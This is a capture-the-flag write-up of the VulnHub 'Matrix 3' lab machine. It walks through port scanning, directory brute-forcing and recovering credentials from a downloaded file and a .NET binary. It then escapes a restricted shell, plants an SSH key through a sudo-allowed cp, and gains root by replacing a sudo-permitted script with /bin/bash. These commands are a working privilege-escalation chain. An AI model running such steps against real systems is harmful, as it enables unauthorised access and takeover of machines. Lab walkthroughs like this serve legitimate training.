
Discovery

Nmap Scanning

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.101
Host is up (0.00049s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
|_http-title: Welcome in Matrix
MAC Address: 08:00:27:E5:B2:AA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 192.168.56.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.91 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scanning All Ports

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-04 04:22 EDT
Nmap scan report for 192.168.56.101
Host is up (0.000056s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
80/tcp   open  http
6464/tcp open  ieee11073-20701
7331/tcp open  swx
MAC Address: 08:00:27:E5:B2:AA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Dirbuster discovered the following image:
Matrix_can-show-you-the-door.png

Browsing http://192.168.56.101/matrix

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/matrix3# dirb http://192.168.56.101/Matrix

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Oct  4 05:27:16 2019
URL_BASE: http://192.168.56.101/Matrix/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.101/Matrix/ ----
+ http://192.168.56.101/Matrix/4 (CODE:301|SIZE:0)                             
+ http://192.168.56.101/Matrix/6 (CODE:301|SIZE:0)                             
+ http://192.168.56.101/Matrix/c (CODE:301|SIZE:0)                             
+ http://192.168.56.101/Matrix/d (CODE:301|SIZE:0)                             
+ http://192.168.56.101/Matrix/e (CODE:301|SIZE:0)                             
+ http://192.168.56.101/Matrix/i (CODE:301|SIZE:0)                             
+ http://192.168.56.101/Matrix/k (CODE:301|SIZE:0)                             
+ http://192.168.56.101/Matrix/n (CODE:301|SIZE:0)                             
+ http://192.168.56.101/Matrix/o (CODE:301|SIZE:0)                             
+ http://192.168.56.101/Matrix/u (CODE:301|SIZE:0)                             
+ http://192.168.56.101/Matrix/v (CODE:301|SIZE:0)                             
+ http://192.168.56.101/Matrix/w (CODE:301|SIZE:0)                             
                                                                    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We found a file called secret.gz and found the login credentials to 192.168.56.101:7331


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/matrix3# wget http://192.168.56.101/Matrix/n/e/o/6/4/secret.gz
--2019-10-04 05:28:28--  http://192.168.56.101/Matrix/n/e/o/6/4/secret.gz
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 39 [application/octet-stream]
Saving to: ‘secret.gz’

secret.gz         100%[===================>]      39  --.-KB/s    in 0s      

2019-10-04 05:28:28 (3.46 MB/s) - ‘secret.gz’ saved [39/39]

root@setrus:~/vulnhub/matrix3# strings secret.gz
admin:76a2173be6393254e72ffa4d6df1030a

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




After logging in we crawl the application

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl -H "Authorization: Basic YWRtaW46cGFzc3dk" http://192.168.56.101:7331/robots.txt
User-agent: *
Disallow: /data/

root@setrus:~# curl -H "Authorization: Basic YWRtaW46cGFzc3dk" http://192.168.56.101:7331/data/

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /data/</title>
<body>
<h2>Directory listing for /data/</h2>
<hr>
<ul>
<li><a href="data">data</a>
</ul>
<hr>
</body>
</html>


root@setrus:~/vulnhub/matrix3# curl -H "Authorization: Basic YWRtaW46cGFzc3dk" http://192.168.56.101:7331/data/data --output data
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9696  100  9696    0     0  1893k      0 --:--:-- --:--:-- --:--:-- 1893k
root@setrus:~/vulnhub/matrix3# ls -al data
-rwxr-xr-x 1 root root 9696 Oct  4 05:35 data
root@setrus:~/vulnhub/matrix3# file data
data: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


This is Windows executable file
We open it with Ghidra :  we found the username and password to login via ssh


Credentials : 
guest
7R1n17yN30


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/matrix3# ssh guest@192.168.56.101 -p6464
guest@192.168.56.101's password: 
Last login: Fri Oct  4 09:40:35 2019 from 192.168.56.102
guest@matrix:~$ id
-rbash: id: command not found
guest@matrix:~$
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Escaping restricted shell

Logging in without profile

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
oot@setrus:~/vulnhub/matrix3# ssh guest@192.168.56.101 -p6464 -t "bash --noprofile"
guest@192.168.56.101's password: 
guest@matrix:~$ id
uid=1000(guest) gid=100(users) groups=100(users),7(lp),11(floppy),17(audio),18(video),19(cdrom),83(plugdev),84(power),86(netdev),93(scanner),997(sambashare)
guest@matrix:~$ sudo -l
User guest may run the following commands on matrix:
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
guest@matrix:~$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


users has sudo -l to trinity user
In order to get access as user trinty, create a pair of ssh-keys and copy them in authorization_keys for trinity

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
guest@matrix:~/.ssh$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/guest/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/guest/.ssh/id_rsa.
Your public key has been saved in /home/guest/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:xP5TWyA6dhta9PcJTbXSjGgYKzAYgOyk+Ss8SYI0QuM guest@matrix
The key's randomart image is:
+---[RSA 2048]----+
|o...oo   .      .|
|.= .  o.  + . + o|
|*..    .oooo.o = |
|+E     o.o.o .+  |
|+..     S + o.o. |
|o..    . * + +...|
|+ ..    . + .  ..|
|.+.        .     |
| ..              |
+----[SHA256]-----+
guest@matrix:~/.ssh$ ls
id_rsa  id_rsa.pub  known_hosts
guest@matrix:~/.ssh$ chmod 777 id_rsa.pub 
guest@matrix:~/.ssh$ cp id_rsa.pub ../
guest@matrix:~/.ssh$ cd ..
guest@matrix:~$ ls
Desktop/    Downloads/  Pictures/  Videos/      prog/
Documents/  Music/      Public/    id_rsa.pub*
guest@matrix:~$ sudo -u trinity /bin/cp id_rsa.pub /home/trinity/.ssh/authorized_keys

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege escalation to root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
guest@matrix:~$ ssh trinity@192.168.56.101 -p6464
The authenticity of host '[192.168.56.101]:6464 ([192.168.56.101]:6464)' can't be established.
ECDSA key fingerprint is SHA256:BMhLOBAe8UBwzvDNexM7vC3gv9ytO1L8etgkkIL8Ipk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[192.168.56.101]:6464' (ECDSA) to the list of known hosts.
Last login: Mon Aug  6 16:37:45 2018 from 192.168.56.102
trinity@matrix:~$ sudo -l
User trinity may run the following commands on matrix:
    (root) NOPASSWD: /home/trinity/oracle
trinity@matrix:~$ ls
Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/
trinity@matrix:~$ echo '/bin/bash' > oracle
trinity@matrix:~$ chmod +x oracle 
trinity@matrix:~$ sudo /home/trinity/oracle
root@matrix:/home/trinity# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


